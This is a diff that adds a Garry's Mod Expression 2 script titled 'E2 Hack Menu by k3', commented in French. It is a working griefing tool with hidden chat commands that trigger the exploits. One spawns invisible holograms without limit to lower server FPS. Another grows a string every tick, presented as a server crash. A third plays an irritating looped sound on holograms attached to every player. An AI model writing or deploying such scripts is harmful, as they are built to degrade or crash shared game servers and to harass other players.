@@ -1,0 +1,149 @@
+@name E2_HackMenu
+
+@persist [ O ]:entity [ IE IT T ]:number [ Exploits Trolls ]:table [ P ]:array
+
+@persist [ EXPLOIT_FPS_HOLO EXPLOIT_FPS_HOLO_INDEX ]:number
+@persist [ EXPLOIT_STRING_CRASH ]:number [ EXPLOIT_STRING_CRASH_STRING ]:string
+@persist [ TROLL_BRUIT_CHIANT ]:number 
+
+################################
+# E2 HACK MENU BY k3 #
+################################
+
+interval(1)
+runOnChat(1)
+
+function hm_addExploit(ExploitName_:string, Timer_:string){
+    
+    print("Exploit trouve : " + ExploitName_ + " ; COMMANDE : " + Timer_)
+    owner():soundPlay(IE, 0, "Buttons.snd3")
+    
+    Exploits[IE, table] = table(ExploitName_, Timer_)
+    IE += 1
+    
+}
+
+function hm_addTroll(TrollName_:string, Timer_:string){
+    
+    print("Troll trouve : " + TrollName_ + " ; COMMANDE : " + Timer_)
+    owner():soundPlay(IT, 0, "Buttons.snd3")
+    
+    Trolls[IT, table] = table(TrollName_, Timer_)
+    IT += 1
+    
+}
+
+function hm_sfx(SoundName_:string){
+    
+    for(I = 0, P:count()){
+
+        holoEntity(I):soundPlay(I, 0, SoundName_)
+        
+    }
+    
+}
+
+if(first()){
+
+    EXPLOIT_FPS_HOLO_INDEX = -1    
+    
+    P = players()
+    
+    for(I = 0, P:count()){
+        
+        Player = P[I, entity]
+
+        holoCreate(I)
+        holoPos(I, Player:pos())
+        holoParent(I, Player)
+        holoAlpha(I, 0)
+
+    }
+    
+    O = owner()
+    hint("E2 Hack Menu By k3", 1000)
+    
+    #Recherche des exploits:
+    if(holoModelAny()){
+        hm_addExploit("Chute des FPS avec holo", "fps_holo")
+    }
+    hm_addExploit("Crash du serveur avec STRING", "string_crash")
+    
+    #Recherche des trolls:
+    hm_addTroll("Bruit agacant", "bruit_chiant")
+    
+}
+
+if(chatClk(O)){
+    
+    Msg = O:lastSaid()
+    
+    for(I = 0, Exploits:count()){
+        
+        if(Msg == Exploits[I, table][2, string]){
+            
+            print("Execution de l'exploit : " + Exploits[I, table][1, string])
+            hideChat(1)
+            owner():soundPlay(0, 0, "Buttons.snd5")
+            
+            timer(Exploits[I, table][2, string], 0)
+        }
+        
+    }
+    
+    for(I = 0, Trolls:count()){
+        
+        if(Msg == Trolls[I, table][2, string]){
+            
+            print("Execution du troll : " + Trolls[I, table][1, string])
+            hideChat(1)
+            owner():soundPlay(0, 0, "Buttons.snd5")
+            
+            timer(Trolls[I, table][2, string], 0)
+        }
+        
+    }
+    
+}
+
+############
+# EXPLOITS #
+############
+
+if(clk("fps_holo")){
+    
+    EXPLOIT_FPS_HOLO = 1
+    
+}
+if(EXPLOIT_FPS_HOLO == 1){
+    
+    holoCreate(EXPLOIT_FPS_HOLO_INDEX)
+    holoModel(EXPLOIT_FPS_HOLO_INDEX, "models/dog.mdl")
+    holoAlpha(EXPLOIT_FPS_HOLO_INDEX, 0)
+    
+    EXPLOIT_FPS_HOLO_INDEX -= 1
+    
+}
+
+if(clk("string_crash")){
+    
+    EXPLOIT_STRING_CRASH = 1
+    
+}
+if(EXPLOIT_STRING_CRASH == 1){
+    
+    while(perf(100)){
+        EXPLOIT_STRING_CRASH_STRING = EXPLOIT_STRING_CRASH_STRING + "ABCD" 
+    }
+}
+
+if(clk("bruit_chiant")){
+    
+    TROLL_BRUIT_CHIANT = 1
+    
+}
+if(TROLL_BRUIT_CHIANT == 1){
+    
+    hm_sfx("d3_citadel.weapon_zapper_beam_loop2")
+
+}
